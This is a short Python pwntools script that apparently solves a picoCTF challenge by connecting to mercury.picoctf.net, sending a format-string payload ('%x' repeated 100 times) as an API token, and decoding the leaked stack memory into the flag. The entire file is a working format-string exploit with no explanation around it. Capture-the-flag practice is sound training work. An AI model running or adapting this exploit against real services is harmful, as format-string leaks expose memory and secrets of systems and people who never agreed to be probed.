from pwn import *
import re

context.log_level = "ERROR"

REMOTE = ("mercury.picoctf.net",  53437)

class Exploit:
    def __init__(self):
        self.remote = "remote(REMOTE[0], REMOTE[1])"
    
    def format_string(self, proc: process):
        proc.recvuntil(b"2) View my portfolio\n")
        proc.sendline(b"1")
        proc.recvuntil(b"What is your API token?\n")
        proc.sendline(b"%x"*100)
        p = proc.recvall(timeout=10)
        return p[26:-224].decode()
    
    def parse(self, flag: bytes):
        flag = unhex(flag)
        flag = flag.decode("latin-1")
        flag = re.search(r"ocip.*?}", flag, re.DOTALL).group(0)
        true_flag = ""
        for i in range(0, len(flag), 4):
            for j in range(3, -1, -1):
                true_flag += flag[i+j]
        return true_flag
    
    def start(self):
        with eval(self.remote) as p:
            leak_data = self.format_string(p)
            decode_leak = self.parse(leak_data)
            print(decode_leak)
            
Exploit().start()